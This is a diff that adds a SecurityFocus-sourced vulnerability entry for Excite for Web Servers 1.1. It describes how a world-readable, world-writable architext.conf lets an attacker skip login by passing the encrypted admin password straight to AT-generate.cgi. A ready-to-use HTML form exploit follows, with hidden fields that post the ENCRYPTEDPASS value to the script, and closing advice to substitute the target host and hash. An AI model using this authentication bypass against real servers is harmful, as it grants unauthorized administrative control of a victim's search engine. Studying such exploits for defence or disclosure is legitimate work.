@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/2665/info
+
+Excite for Web Servers 1.1 (EWS) is a search engine suite for web servers running under Windows NT and UNIX. By default the file containing the administrative password, architext.conf, is world readable and world writable. This allows an attacker with local access to gain administrative privileges over EWS. This password is encrypted, but the attacker can bypass the normal login method and pass the encrypted password directly to the script responsible for authenticating the user - /cgi-bin/AT-generate.cgi. This can be done with the help of a simple HTML form or passed directly to the script as the "ENCRYPTEDPASS" parameter. Since the file is also world writable, the attacker could make up an "encrypted" password and overwrite the file with it, then submit the new encrypted password. 
+
+<html> <head><title>exploit</title>
+<body>
+<p><FORM ACTION="http://EWS.SERVER.COM/cgi-bin/AT-generate.cgi" METHOD=POST>
+<INPUT TYPE="hidden" NAME="db" VALUE="personal">
+<INPUT TYPE="submit" NAME="Reload" VALUE="Reload">
+Reload this page, in case the log file or status has changed.
+<INPUT TYPE="hidden" NAME="Dump" VALUE="dummy">
+<INPUT TYPE="hidden" NAME="File" VALUE="/usr/local/etc/excite/collections/AT-personal.prog">
+<INPUT TYPE="hidden" NAME="Type" VALUE="progress">
+<INPUT TYPE="hidden" NAME="ENCRYPTEDPASS" VALUE="ENCRYPTEDPASS">
+</FORM><BR>
+</body>
+</html>
+
+"Of course you should replace EWS.SERVER.COM and ENCRYPTEDPASS with values that make sense for your situation. By accessing this page and clicking on the button you get to a menu that behaves exactly as if you knew the unencrypted password." 
